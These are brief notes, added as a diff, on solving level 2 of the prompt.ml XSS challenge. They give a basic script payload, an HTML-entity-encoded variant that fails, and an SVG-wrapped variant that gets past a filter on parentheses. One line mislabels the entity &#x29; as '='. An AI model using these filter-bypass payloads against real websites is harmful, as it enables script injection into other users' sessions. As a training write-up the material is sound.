@@ -1,1 +1,15 @@
+ PROMPT.ML | 0x2 | XSS Challange | Level 2 | Explained 
+https://youtu.be/alJLOOLNrHE?feature=shared
 
+normal payload = <script>alert('XSS')</script>
+waf blocks (= so html encode
+'(' = &#x28; 
+'=' = &#x29;
+
+payload with html encode
+<script>alert&#x28;'1'&#x29;</script> but not triggered because &#x28; and &#x29; are HTML entities that get decoded to ( and ) in HTML context,
+but the script tag content is treated as text, not HTML.
+
+payload with svg
+<svg><script>alert&#x28;'1'&#x29;</script>
+Executed because SVG elements can contain script elements that execute in HTML context
